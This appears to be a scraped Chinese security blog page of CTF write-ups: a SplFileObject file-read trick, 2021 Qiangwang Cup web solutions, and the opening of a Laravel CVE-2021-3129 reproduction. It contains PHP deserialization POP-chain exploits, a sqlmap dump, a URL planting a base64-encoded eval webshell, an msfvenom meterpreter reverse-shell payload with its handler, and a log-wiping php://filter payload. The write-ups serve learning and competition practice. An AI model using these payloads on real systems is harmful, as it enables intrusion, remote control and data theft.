刚好找到一个脚本 （ 可以查看PHP原生类即内置类，查看拥有所需魔术方法的类如下 这里只获取 __toString，所以把其他注释了 12345678910111213141516171819202122&lt;?php$classes = get_declared_classes(); //获取所有已定义类foreach($classes as $class) &#123; $methods = get_class_methods($class); //获取当前类所拥有的方法 foreach ($methods as $method) &#123; if (in_array($method, array(// &#x27;__destruct&#x27;, &#x27;__toString&#x27;,// &#x27;__wakeup&#x27;,// &#x27;__call&#x27;,// &#x27;__callStatic&#x27;,// &#x27;__get&#x27;,// &#x27;__set&#x27;,// &#x27;__isset&#x27;,// &#x27;__unset&#x27;,// &#x27;__invoke&#x27;,// &#x27;__set_state&#x27; //调用var_export导出类时被调用 ))) &#123; print &quot;$class::$method&quot;;echo &#x27;&lt;br&gt;&#x27;; &#125; &#125;&#125; 运行结果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657Exception::__toStringErrorException::__toStringError::__toStringParseError::__toStringTypeError::__toStringArgumentCountError::__toStringArithmeticError::__toStringDivisionByZeroError::__toStringClosedGeneratorException::__toStringDOMException::__toStringLogicException::__toStringBadFunctionCallException::__toStringBadMethodCallException::__toStringDomainException::__toStringInvalidArgumentException::__toStringLengthException::__toStringOutOfRangeException::__toStringRuntimeException::__toStringOutOfBoundsException::__toStringOverflowException::__toStringRangeException::__toStringUnderflowException::__toStringUnexpectedValueException::__toStringCachingIterator::__toStringRecursiveCachingIterator::__toStringSplFileInfo::__toStringDirectoryIterator::__toStringFilesystemIterator::__toStringRecursiveDirectoryIterator::__toStringGlobIterator::__toStringSplFileObject::__toStringSplTempFileObject::__toStringIntlException::__toStringAssertionError::__toStringPDOException::__toStringPharException::__toStringPhar::__toStringPharData::__toStringPharFileInfo::__toStringReflectionException::__toStringReflectionFunctionAbstract::__toStringReflectionFunction::__toStringReflectionParameter::__toStringReflectionType::__toStringReflectionNamedType::__toStringReflectionMethod::__toStringReflectionClass::__toStringReflectionObject::__toStringReflectionProperty::__toStringReflectionClassConstant::__toStringReflectionExtension::__toStringReflectionZendExtension::__toStringmysqli_sql_exception::__toStringSimpleXMLElement::__toStringSimpleXMLIterator::__toStringSoapFault::__toStringSodiumException::__toString 看到一些反射之类的，当然发现了一个 SplFileObject 类，发现他的 __toString 方法是 SplFileObject::fgets 方法的别名，作用是一行行文件读取。 flag 文件一般是一行，刚好满足要求。 实际利用创建一个 flag 文件，内容为 先构造 session 12345&lt;?phpini_set(&#x27;session.save_path&#x27;, &#x27;/tmp&#x27;);session_start();$_SESSION[&#x27;paths&#x27;] = array();$_SESSION[&#x27;paths&#x27;][&quot;/tmp/flag&quot;] = &#x27;SplFileObject&#x27;; 然后访问一下这个文件，记得看请求的 Cookie: PHPSESSID 的值，然后到本地找到文件，把生成的内容复制一下，粘贴到 content 字段。因为php session 都是sess开头的，所以通过目录穿越写入 sess_tari 写入session后 实例化时，实际是实例化了 SplFileObject(&quot;/tmp/flag&quot;) 然后就会输出任意我们想输出的文件内容了 搞定~ 参考链接[1] https://www.freebuf.com/articles/web/263710.html [2] https://mp.weixin.qq.com/s/ucjyuXnWn4PkiD_40Eydkw","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctf比赛","slug":"ctf/ctf比赛","permalink":"https://tari.moe/categories/ctf/ctf%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctf比赛","slug":"ctf比赛","permalink":"https://tari.moe/tags/ctf%E6%AF%94%E8%B5%9B/"}]},{"title":"2021强网杯 Web Writeup","slug":"2021/2021qwb","date":"2021-06-14T14:14:09.000Z","updated":"2022-02-01T04:24:26.814Z","comments":true,"path":"/p/2021/2021qwb/","link":"","permalink":"https://tari.moe/p/2021/2021qwb/","excerpt":"","text":"今年题目质量还不错，竟然还有内网渗透部分，2333，因为平常CTF比较少 毕设刚好是做代码审计相关的，刚刚好又在 POP链这个题用上了，还挺开心~ 0x1 Hard_Penetrationby Challenger 发现这是 shiro n day漏洞 顺便写了个内存马 连上去发现权限比较小，需要提权 然后尝试了 msf自带的，无果 尝试 https://github.com/mzet-/linux-exploit-suggester https://github.com/InteliSecureLabs/Linux_Exploit_Suggester 无果 有点像mysql udf 提权，不过不知道用户名和密码 源码包也找不到 看了下 flag 是www-data 权限，本机可能还有服务，扫了一下发现在 8005端口，然后代理转发出来（转发过程可参考 0x4 EasyWeb 的端口转发过程） 报错发现是 thinkphp 3.1.3，然后链接显示去 baocms https://github.com/IsCrazyCat/demo-baocms-v17.1 审计走起 看了下，大概路由和控制器的对应关系如下 http://119.23.55.232:670/wap/ 前端就在 themes/Wap/ 里找，后端方法在/Lib/Action/Wap 里找，和URL对应就好 同理 http://119.23.55.232:670/admin/ 前端就在 themes/Admin/ 里找，后端方法在/Lib/Action/Admin 里找 然后后端方法的 xxxxAction.class.php 中的 Action.class.php 应该是其的加载规范，这个和laravel有点像 等wp吧。。。 还是没找到漏洞点。。。 #更新 赛后和xlw师兄交流了一波，发现漏洞点在 额，完全看不出来。。控制器太多了，，有点难看不出来，太菜了（ 0x2 pop_masterby tari index.php 代码 12345678&lt;?phpinclude &quot;class.php&quot;;//class.php.txthighlight_file(__FILE__);$a = $_GET[&#x27;pop&#x27;];$b = $_GET[&#x27;argv&#x27;];$class = unserialize($a);$class-&gt;NGPaqV($b); 明显的反序列化，但看 class.php.txt 后发现很乱。 📎class.php.txt 很多链是混淆的，有的是会覆盖值的，导致链就算构造了也无法进行反序列化 根据如下4点思路去过滤 eval 没被引用，过滤 for 循环中会覆盖传入参数值，过滤 eval 前会覆盖值参数值，过滤 除了入口函数外，其他函数只被引用一次的，过滤 第2和3会覆盖值的是重点，第1和4，一次性过滤多点加快收敛速度（节约下一次运行脚本时间） 编写脚本如下，根据 AST 去剪切不需要的节点（即根据上面4点去除无用或会影响结果的函数） 之所以用 AST 是因相比正则或其他更能精准的剪切节点，PHP AST库传送门。 $entryFunc 入口函数名称，根据实际情况来，即 index.php 里调用的函数 $class-&gt;NGPaqV($b); PHP运行内存默认是 128M，在解析18w行代码会因内存不足退出，我这里php.ini 增加到 8196M 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;?php// 16w 行代码大概跑 105s, 定义300s肯定不会超时ini_set(&#x27;max_execution_time&#x27;, &#x27;300&#x27;);require &#x27;vendor/autoload.php&#x27;;use PhpParser\\Error;use PhpParser\\NodeDumper;use PhpParser\\ParserFactory;use PhpParser\\PrettyPrinter;// 入口函数名称$entryFunc = &#x27;NGPaqV&#x27;;// 输入文件$inputPhpFile = &#x27;./class.php&#x27;;// 输出文件$outputPhpFile = &#x27;./class.php&#x27;;$code = file_get_contents($inputPhpFile);echo &#x27;[+] get file content done&#x27;.&quot;\\n&quot;;$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);try &#123; $ast = $parser-&gt;parse($code);&#125; catch (Error $error) &#123; echo &quot;Parse error: &#123;$error-&gt;getMessage()&#125;\\n&quot;; return;&#125;echo &#x27;[+] parse done&#x27;. &quot;\\n&quot;;// 计数删了多少个函数$deleteCnt = 0;// $dumper = new NodeDumper;// echo $dumper-&gt;dump($ast) . &quot;\\n&quot;;foreach ($ast as $k=&gt;$subclass) &#123; foreach ($subclass-&gt;stmts as $kk=&gt;$classMember) &#123; if ($classMember instanceof PhpParser\\Node\\Stmt\\ClassMethod) &#123; // echo $dumper-&gt;dump($classMember) . &quot;\\n&quot;; // 除入口函数外的类方法没有被引用则删除 if (substr_count($code, $classMember-&gt;name-&gt;name) === 1 &amp;&amp; $classMember-&gt;name-&gt;name !== $entryFunc) &#123; $deleteCnt++; unset($subclass-&gt;stmts[$kk]); continue; &#125; if (! $classMember-&gt;params) &#123; // 只获取第一个参数 continue; &#125; $param = $classMember-&gt;params[0]-&gt;var-&gt;name; // 获取方法参数 foreach ($classMember-&gt;stmts as $kkkk =&gt; $subStatements) &#123; // echo $dumper-&gt;dump($subStatements) . &quot;\\n&quot;; // 参数 if ($subStatements instanceof PhpParser\\Node\\Stmt\\For_) &#123; $assignLeft = $subStatements-&gt;stmts[0]-&gt;expr-&gt;var-&gt;name; # 参数会被赋值覆盖 if ($param === $assignLeft) &#123; # 删除该节点 $deleteCnt++; unset($subclass-&gt;stmts[$kk]); continue; &#125; &#125; if ($subStatements instanceof PhpParser\\Node\\Stmt\\Expression) &#123; // 参数值会被覆盖 if ($subStatements-&gt;expr instanceof PhpParser\\Node\\Expr\\Assign) &#123; if ($param === $subStatements-&gt;expr-&gt;var-&gt;name) &#123; $deleteCnt++; unset($subclass-&gt;stmts[$kk]); continue; &#125; &#125; // eval 是否不被引用 if ($subStatements-&gt;expr instanceof PhpParser\\Node\\Expr\\Eval_) &#123; // 函数名称只出现一次 if (substr_count($code, $classMember-&gt;name-&gt;name) === 1) &#123; $deleteCnt++; unset($subclass-&gt;stmts[$kk]); continue; &#125; &#125; &#125; &#125; &#125; &#125;&#125;echo &#x27;[+] filter done&#x27;.&quot;\\n&quot;;// 输出$prettyPrinter = new PrettyPrinter\\Standard;$afterFilter = $prettyPrinter-&gt;prettyPrintFile($ast);file_put_contents($outputPhpFile, $afterFilter);echo &#x27;[+] total filter: &#x27;.$deleteCnt. &#x27; function&#x27;.&quot;\\n&quot;; 多运行几遍上面代码，大概15次左右，大概消耗20分钟左右，就会显示过滤完成了，即 total filter: 0 function。（脚本还可以改进，例如把没用的类也去掉） 去除完后，搜索发现就只有一个 eval，接下来反过来跟这条链即可~ 构造 POP链如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204&lt;?phpclass xCUG62&#123; public $rLTCpuG; function __construct() &#123; &#125;&#125;class E984fn&#123; public $GcQ9wNy; function __construct() &#123; $this-&gt;GcQ9wNy = new xCUG62(); &#125;&#125;class zOTHpM&#123; public $HiDCYPi; function __construct() &#123; $this-&gt;HiDCYPi = new E984fn(); &#125;&#125;class S0bXG3&#123; public $t8FQmBq; function __construct() &#123; $this-&gt;t8FQmBq = new zOTHpM(); &#125;&#125;class LTswgA&#123; public $GP8GMDp; function __construct() &#123; $this-&gt;GP8GMDp = new S0bXG3(); &#125;&#125;class Br2Com&#123; public $aSGzyvk; function __construct() &#123; $this-&gt;aSGzyvk = new LTswgA(); &#125;&#125;class MwVbup&#123; public $qFwGWF6; function __construct() &#123; $this-&gt;qFwGWF6 = new Br2Com(); &#125;&#125;class xxAkFU&#123; public $YRn1G6B; function __construct() &#123; $this-&gt;YRn1G6B = new MwVbup(); &#125;&#125;class UOPWFh&#123; public $w2rcmoW; function __construct() &#123; $this-&gt;w2rcmoW = new xxAkFU(); &#125;&#125;class fTTYmp&#123; public $Ma3Koaf; function __construct() &#123; $this-&gt;Ma3Koaf = new UOPWFh(); &#125;&#125;class zuNg7f&#123; public $TNngTy9; function __construct() &#123; $this-&gt;TNngTy9 = new fTTYmp(); &#125;&#125;class Q0Ehc0&#123; public $Eze6mbP; function __construct() &#123; $this-&gt;Eze6mbP = new zuNg7f(); &#125;&#125;class LNv8hP&#123; public $kiZRG9G; function __construct() &#123; $this-&gt;kiZRG9G = new Q0Ehc0(); &#125;&#125;class RLadP4&#123; public $FkQAZ7e; function __construct() &#123; $this-&gt;FkQAZ7e = new LNv8hP(); &#125;&#125;class K1lpuz&#123; public $ZH6YAPE; function __construct() &#123; $this-&gt;ZH6YAPE = new RLadP4(); &#125;&#125;class lIcDR2&#123; public $Q7WCRu9; function __construct() &#123; $this-&gt;Q7WCRu9 = new K1lpuz(); &#125;&#125;class xk6AMC&#123; public $nqGOOTr; function __construct() &#123; $this-&gt;nqGOOTr = new lIcDR2(); &#125;&#125;class mDnkFh&#123; public $SLzu22G; function __construct() &#123; $this-&gt;SLzu22G = new xk6AMC(); &#125;&#125;class LvG62O&#123; public $AByNdFw; function __construct() &#123; $this-&gt;AByNdFw = new mDnkFh(); &#125;&#125;class v00XnF&#123; public $S9vaxl3; function __construct() &#123; $this-&gt;S9vaxl3 = new LvG62O(); &#125;&#125;class mRhBx7&#123; public $uMKr13G; function __construct() &#123; $this-&gt;uMKr13G = new v00XnF(); &#125;&#125;class Eckd7K&#123; public $bR5zBKO; function __construct() &#123; $this-&gt;bR5zBKO = new mRhBx7(); &#125;&#125;class gGHPEt&#123; public $IOGuqdZ; function __construct() &#123; $this-&gt;IOGuqdZ = new Eckd7K(); &#125;&#125;// 1class OcZqBy&#123; public $yHPAqE1; function __construct() &#123; $this-&gt;yHPAqE1 = new gGHPEt(); &#125;&#125;class NGPaqV&#123; public $ZwSdRyt; function __construct() &#123; $this-&gt;ZwSdRyt = new OcZqBy(); &#125;&#125;$NG = new NGPaqV();echo serialize($NG); 还有多余的字符拼接在我们可控字符的后面，因最终是 eval 转换为代码，通过注释去掉即可 即可获得flag 0x3 （部分）WhereIsUWebShell赛后和xlw师兄交流了一波，表示学到了~！ 先贴贴原题代码 1234567891011121314151617181920212223242526272829303132333435I see your Cookie&lt;!-- You may need to know what is in e2a7106f1cc8bb1e1318df70aa0a3540.php--&gt;&lt;?php// index.phpini_set(&#x27;display_errors&#x27;, &#x27;on&#x27;);if(!isset($_COOKIE[&#x27;ctfer&#x27;]))&#123; setcookie(&quot;ctfer&quot;,serialize(&quot;ctfer&quot;),time()+3600);&#125;else&#123; include &quot;function.php&quot;; echo &quot;I see your Cookie&lt;br&gt;&quot;; $res = unserialize($_COOKIE[&#x27;ctfer&#x27;]); if(preg_match(&#x27;/myclass/i&#x27;,serialize($res)))&#123; throw new Exception(&quot;Error: Class &#x27;myclass&#x27; not found &quot;); &#125;&#125;highlight_file(__FILE__);echo &quot;&lt;br&gt;&quot;;highlight_file(&quot;myclass.php&quot;);echo &quot;&lt;br&gt;&quot;;highlight_file(&quot;function.php&quot;);&lt;?php// myclass.phpclass Hello&#123; public function __destruct() &#123; if($this-&gt;qwb) echo file_get_contents($this-&gt;qwb); &#125;&#125;?&gt;&lt;?php// function.phpfunction __autoload($classname)&#123; require_once &quot;/var/www/html/$classname.php&quot;;&#125;?&gt; 简要分析一下，存在以下几个文件 index.php 入口，也是反序列化点，不过存在正则 preg_match(&#39;/myclass/i&#39;,serialize($res)) 需要绕过 myclass.php 文件读取点 function.php __autoload 魔术方法文件，当实例化一个类时候，如 new myclass(); 然后找不到这个类时，会调用这个魔术方法，本题表现为包含某个文件。 e2a7106f1cc8bb1e1318df70aa0a3540.php 应该是提示之类的 这里正则绕过的思路很巧妙，表示学到了！ 首先，如果没有反序列化 myclass 类，就因没包含 myclass.php 文件，进而导致利用不了 Hello 类 观察 index.php 代码可知，首先是反序列化 Cookie 里的序列化数据，然后在序列化刚刚反序列化的数据。这里看似，，好像无法修改，但仔细想想，PHP里有没有什么数据结构，会先天性存在，写入同一个位置会存在覆盖关系的，就豁然开朗了！ 没错，就是，数组，只要反序列化数组，都在数据的同一位置，反序列化时，反序列化数组的第一个位置是 myclass 类，就会包含 myclass.php，然后同一第一个位置也是 Hello 类，那么就会覆盖第一个位置的 myclass 类，但此时 myclass.php，已经包含进来了，那么 Hello 类自然也能正常被反序列化了 构造 POC 123456789101112131415&lt;?phpclass myclass &#123;&#125;class Hello&#123; public $qwb;&#125;$he = new Hello();$he-&gt;qwb = &#x27;/Users/tari/Sites/tari_local/e2a7106f1cc8bb1e1318df70aa0a3540.php&#x27;;$arr[1] = new myclass();$arr[0] = $he;echo urlencode(str_replace(&quot;i:0&quot;, &quot;i:1&quot;, serialize($arr))); 就绕过去了 6月24日更新 从Nu1L的wp中看到的另外一种绕过方法，POC如下 1234567891011121314151617&lt;?phpclass myclass&#123; public $test;&#125;class Hello&#123;&#125;$a = new myclass();$b = new Hello();$b-&gt;qwb = &quot;e2a7106f1cc8bb1e1318df70aa0a3540.php&quot;;$a-&gt;test = $b;$raw_exp = serialize($a);echo urlencode(substr($raw_exp, 0, strlen($raw_exp) - 1)); 即去除了序列化后数据最后一个花括号，能正常反序列化，但因序列化数据最后一位有误，unserialize 执行出现异常， $res 为 false，所以绕过了正则表达式 本地中 e2a7106f1cc8bb1e1318df70aa0a3540.php 文件内容为 12&lt;?php$hint = &#x27;hint&#x27;; 正常读取文件内容 0x4 [强网先锋]赌徒by tari 目录爆破 -&gt; www.zip 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;meta charset=&quot;utf-8&quot;&gt;&lt;?php//hint is in hint.phperror_reporting(1);class Start&#123; public $name=&#x27;guest&#x27;; public $flag=&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;; public function __construct()&#123; echo &quot;I think you need /etc/hint . Before this you need to see the source code&quot;; &#125; public function _sayhello()&#123; echo $this-&gt;name; return &#x27;ok&#x27;; &#125; public function __wakeup()&#123; echo &quot;hi&quot;; $this-&gt;_sayhello(); &#125; public function __get($cc)&#123; echo &quot;give you flag : &quot;.$this-&gt;flag; return ; &#125;&#125;class Info&#123; private $phonenumber=123123; public $promise=&#x27;I do&#x27;; public function __construct()&#123; $this-&gt;promise=&#x27;I will not !!!!&#x27;; return $this-&gt;promise; &#125; public function __toString()&#123; return $this-&gt;file[&#x27;filename&#x27;]-&gt;ffiillee[&#x27;ffiilleennaammee&#x27;]; &#125;&#125;class Room&#123; public $filename=&#x27;/flag&#x27;; public $sth_to_set; public $a=&#x27;&#x27;; public function __get($name)&#123; $function = $this-&gt;a; return $function(); &#125; public function Get_hint($file)&#123; $hint=base64_encode(file_get_contents($file)); echo $hint; return ; &#125; public function __invoke()&#123; $content = $this-&gt;Get_hint($this-&gt;filename); echo $content; &#125;&#125;if(isset($_GET[&#x27;hello&#x27;]))&#123; unserialize($_GET[&#x27;hello&#x27;]);&#125;else&#123; $hi = new Start();&#125;?&gt; 调用逻辑为，反序列化调用 Start 类的 __wakeup 魔术方法 -&gt; 调用 $this-&gt;_sayhello(); ，里面有 echo，可以触发 Info 类的 __toString 魔术方法，然后 Room 类无 ffiillee[&#39;ffiilleennaammee&#39;] 属性，进而触发 __get 魔术方法，最好先构造后 Room 类 $a 成员为 Room 对象即可（这里的坑为 $a 成员的 Room 对象不能在构造方法里构造，否则因这三个类相互调用而报错） 构造 POP链 1234567891011121314151617181920212223242526272829&lt;?phpclass Start&#123; public $name=&#x27;guest&#x27;; public $flag=&#x27;1&#x27;;&#125;class Info&#123; private $phonenumber = 123123; public $promise = &#x27;Ido&#x27;;&#125;class Room&#123; public $filename=&#x27;/flag&#x27;; public $sth_to_set; public $a=&#x27;&#x27;;&#125;$st = new Start();$if = new Info();$ro = new Room();$st-&gt;name = $if;$if-&gt;file[&#x27;filename&#x27;] = $ro;$ro-&gt;a = new Room();echo urlencode(serialize($st)); 注意这个 hi，不是base64编码后的，注意去掉~ 得到flag 0x5 [强网先锋]寻宝key1by tari 数字大于 1026即可 科学计数法绕过 跑一下脚本即可 1234567891011import hashlibtarget = &#x27;4bf21cd&#x27;candidate = 0while True: plaintext = str(candidate) hash = hashlib.md5(plaintext.encode(&#x27;ascii&#x27;)).hexdigest() if hash[:7] == target: print(&#x27;plaintext:&quot;&#x27; + plaintext + &#x27;&quot;, md5:&#x27; + hash) break candidate = candidate + 1 浮点数绕过 让json解析失败即可 1ppp[number1]=1026a&amp;ppp[number2]=10e8&amp;ppp[number3]=61823470&amp;ppp[number4]=0.00000.0&amp;ppp[number5]=&#123;\\&quot;a&quot;:1&#125; key1 KEY1{e1e1d3d40573127e9ee0480caf1283d6} key2challenger 来了句，有没有可能直接在文件里呢？ 脚本安排上 12345678910111213141516171819202122232425import osimport docxdef dir_file(file_path): file_list = [] for top, dirs, non_dirs in os.walk(file_path): for item in non_dirs: file_list.append(os.path.join(top, item)) return file_listdocx_list = filter(lambda s: s.endswith(&#x27;.docx&#x27;), dir_file(&#x27;/Users/tari/Downloads/five_month&#x27;))for docx_file in docx_list: try: docx_object = docx.Document(docx_file) except docx.opc.exceptions.PackageNotFoundError: print(&#x27;open failed: &#123;&#125;&#x27;.format(docx_file)) continue for para in docx_object.paragraphs: if &quot;KEY2&quot; in para.text: print(docx_file) print(para.text) break key2 KEY2{T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS} 提交两个key即可获得 flag 0x6 EasyWebby challenger 目录爆破 -&gt; /hint 访问一下得到提示 尝试扫描 35000-40000端口 访问发现是个后台 貌似存在sql注入 sqlmap还可以直接跑出来 1sqlmap -r sql.log -D easyweb -T employee -C username,passwd 帐号密码 admin/99f609527226e076d668668582ac4420 暂时没找到 ssrf 点在哪 不过找到一个文件上传点 过滤了一些字段，不过可以字符串拼接 whoami 是 www-data 然后flag没权限 查看提示 mysql 限制了文件的读取位置 这里直接写入webshell不知为何无法写入成功，因此在写入了 system 命令下，把webshell进行编码在写入 1http://47.104.137.239:36842//upload//1aadcef13858c71dacc8e00b17d0cd10//phpinfo.php?s=echo%20%22PD9waHAgZXZhbChAJF9QT1NUWyJzIl0pOyA%2fPg%3d%3d%22|base64%20-d%20%3E%20s.php 然后看下端口，一个个试试 在 8006 发现 Jboss，端口转发出来 为了上传下载文件稳定性，这里用 msf进行（reGeorg 可能环境原因连不上） 生成马 1msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=服务器IP lport=667 -f elf &gt; msf_667 msfconsole上监听 12345use exploit/multi/handleset payload linux/x64/meterpreter/reverse_tcpset lhost 0.0.0.0set lport 667run 把生成的马上传上webshell，然后运行 12chmod +x /tmp/msf_667/tmp/msf_667 在反弹回来的meterpreter上进行端口转发 1portfwd add -l 670 -p 8005 -r 127.0.0.1 可正常访问，并且得知为 JBoss 4.0，有个反序列化漏洞。 访问如下链接，确实可以利用 使用jexboss利用 https://github.com/joaomatosf/jexboss","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctf比赛","slug":"ctf/ctf比赛","permalink":"https://tari.moe/categories/ctf/ctf%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctf比赛","slug":"ctf比赛","permalink":"https://tari.moe/tags/ctf%E6%AF%94%E8%B5%9B/"}]},{"title":"Laravel8 CVE-2021-3129 复现分析","slug":"2021/laravel8-debug-rce","date":"2021-06-03T05:00:48.000Z","updated":"2022-02-01T04:24:02.874Z","comments":true,"path":"/p/2021/laravel8-debug-rce/","link":"","permalink":"https://tari.moe/p/2021/laravel8-debug-rce/","excerpt":"","text":"1. 前言由于参加两次CTF都遇上了反序列化+PHP各种filter过滤器的利用，然后对一些不常见filter的利用不是很熟悉，因此复现分析一下 CVE-2021-3129，因为这个CVE对一些filter利用的比较巧妙 ignition组件是Laravel5.5及其之后的使用的自定义错误页面美化组件，2.5.2 版本之前因 file_get_contents() 和 file_put_contents()两个函数不安全使用导致攻击者可以在Laravel框架（&lt;8.4.2）开启debug模式的情况下未授权RCE。 影响范围[1-2] ignition &gt;= 2.5.0, &lt; 2.5.2 &gt;= 2.0.0, &lt; 2.4.2 &gt;= 1.7.0, &lt; 1.16.14 &lt; 1.6.15 Laravel &lt; 8.4.2 2. 环境搭建复现环境：PHP 7.3.24 2.1 安装 composerhttps://getcomposer.org/download/ 123456php -r &quot;copy(&#x27;https://getcomposer.org/installer&#x27;, &#x27;composer-setup.php&#x27;);&quot;php -r &quot;if (hash_file(&#x27;sha384&#x27;, &#x27;composer-setup.php&#x27;) === &#x27;756890a4488ce9024fc62c56153228907f1545c228516cbf63f885e036d37e9a59d27d63f46af1d4d07ee0f76181c7d3&#x27;) &#123; echo &#x27;Installer verified&#x27;; &#125; else &#123; echo &#x27;Installer corrupt&#x27;; unlink(&#x27;composer-setup.php&#x27;); &#125; echo PHP_EOL;&quot;php composer-setup.phpphp -r &quot;unlink(&#x27;composer-setup.php&#x27;);&quot;sudo mv composer.phar /usr/local/bin/composer 2.2 安装 Laravel1234567git clone https://github.com/laravel/laravel.gitcd laravelgit checkout -b e849812composer installcomposer require facade/ignition==2.5.1cp .env.example .envphp artisan key:generate .env.example 默认配置是debug模式，可不予理会 然后启动 Apache 环境即可，访问 1http://xxxx/public/index.php 这里不用 php artisan serve 启动因为没有Apache集成环境debug方便 2.3 编写漏洞入口代码先在 resources/views 目录下新建一个文件 hello.blade.php，内容为 12345&lt;html&gt;&lt;body&gt; &lt;h1&gt; Hello &#123;&#123; $username &#125;&#125; &lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; routes/web.php 增加路由 123Route::get(&#x27;/hello&#x27;, function () &#123; return view(&#x27;hello&#x27;);&#125;); 访问这个视图 1http://laravel8.tari:8890/public/index.php/hello 正常出现变量未定义报错信息 3. 漏洞分析3.1 触发点路由追踪点击 Make variable optional 并抓包，这个方法会自动把我们模板的 &#123;&#123; $username &#125;&#125; 替换为 &#123;&#123; $username ?? '' &#125;&#125;，即添加一个默认值 可以看到，请求的路径为 _ignition/execute-solution 全局分别搜一下 _ignition 和 execute-solution 可知 本API对应的方法为 vendor/facade/ignition/src/IgnitionServiceProvider.php 中的 ExecuteSolutionController 类 跟进此类，下个断点发现ExecuteSolutionController类对象会被当做函数调用 与其定义的 __invoke 魔术方法一致。 在__invoke 魔术方法中先调用 1$solution = $request-&gt;getRunnableSolution(); 获取 $solution 对象随后调用 $solution对象的 run方法 跟进得知 $solution 即为我们 POST 传入的 1&quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot; 跟进 $solution-&gt;run(); 逻辑可简化为 12$originalContents = file_get_contents($parameters[&#x27;viewFile&#x27;]);file_put_contents($parameters[&#x27;viewFile&#x27;], $output); 其中 $parameters 为我们 POST 传入的 1&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;username&quot;,&quot;viewFile&quot;:&quot;/Users/tari/Sites/laravel/resources/views/hello.blade.php&quot;&#125; 之所以可以简化为两行，是因为中间的逻辑主要为，在 $this-&gt;makeOptional($parameters);方法里把 $parameters[&#39;variableName&#39;]加上 &quot;?? &#39;&#39;&quot; ，之后为从词法分析层面，即 $this-&gt;generateExpectedTokens() 中，是否真的在变量 $parameters[&#39;variableName&#39;] 期望位置加上了 &quot;?? &#39;&#39;&quot; ，加上了的话就返回替换后的内容。所以只要我们传入的 $parameters[&#39;variableName&#39;] 变量在模板文件中真实存在，多为满足条件的。当然这是建立在我们只到变量名称的情况下，如果不知道呢？ 换个角度理解，只要我们传入的变量是模板中不存在的，那么 $newTokens 恒为 [0]，$expectedTokens 也是恒为 [0]，那么 $expectedTokens !== $newTokens 恒成立，压根就不用管这部分逻辑。 3.2 漏洞点分析 file_get_contents 和 file_put_contents 读取和写入的文件是一样的，且文件输出内容几乎不可控，相当于读取一个文件，又写回去，就加上了 &quot;?? &#39;&#39;&quot; 。 虽然 $parameters[&#39;variableName&#39;] 不太可控，但 file_get_contents 和 file_put_contents 的输入，即$parameters[&#39;viewFile&#39;] 是可控的。然后服务端上我们可控的文件只有日志文件，这里使用 Laravel 的日志文件，默认位置是 storage/logs/laravel.log ，是用来记录一些 ERROR 级别的报错日志。 格式可分为 4 部分，时间、错误、错误描述、错误堆栈 先尝试一下输入的内容是否能正常的写入日志文件中 可以正常写入，也就是，日志文件大概如下结构，其中payload为我们可控部分 1[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2]部分PAYLOAD[suffix] 问题在于，如何在存在[prefix] [midfix1] [midfix2] [suffix] 的情况下，如何让可控PAYLOAD被利用？ 首先，考虑 phar://数据流包装器，因为 file_get_contents 会触发 phar 的反序列化，通过 viewFile 传入即可。但这里会遇到几个问题 3.3 尝试 base64 过滤器修改内容PHP 中 base64 解码会过滤除特殊字符，如 1echo base64_decode(&#x27;[;#MQ==#...&lt;&lt;&gt;&#x27;); &#39;1&#39; 等价于 base64_decode(&#39;MQ==&#39;) 等价于 base64_decode(&#39;[;#MQ==#...&lt;&lt;&gt;&#39;) 然后PHP的base64_decode解码还有一个特性，在需要解码的字符串长度不足4的倍数时，会自动添加 = 号填充，也就是说，没有因输入的字符串不符合base64编码后的规则而抛出异常一说，直至把字符串解码为空串 但问题在于，这个值难以控制，如日志里的时间 1234php &gt; var_dump(base64_decode(base64_decode(&#x27;[2021-06-05 05:21:45]&#x27;)));string(1) &quot;3&quot;php &gt; var_dump(base64_decode(base64_decode(&#x27;[2021-06-06 05:21:45]&#x27;)));string(0) &quot;&quot; 稍微把5变为6，结果则不尽相同。此外，后面还有调用栈等复杂的字符串，处理起来比较麻烦。 不过PHP base64特性也不是一无是处，我们可以利用它清空laravel.log使我们受到的干扰进一步降低。经实验，258278字符的日志文件在经过 8次 base64_decode后即可变为空。即多请求几次这个接口即可清空日志文件。 1&#123;&quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;suiyi&quot;,&quot;viewFile&quot;:&quot;php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log&quot;&#125;&#125; 理想中是美好的，但意外却发生了 上图中报错，是因为日志文件中含有 = 号，但等号在 base64编码中是结束用的填充符号，会使得PHP base64解码过滤器抛出异常[5]。 原来，filter过滤器中的base64解码和直接用 base64_decode是不同的。3.3小节开头中用base64_decode函数字符串中含有 = 号是能正常解码的。 但假设不存在 = 号，清空文件是无问题的哈 或者一步到位，结合多个base64解码过滤器 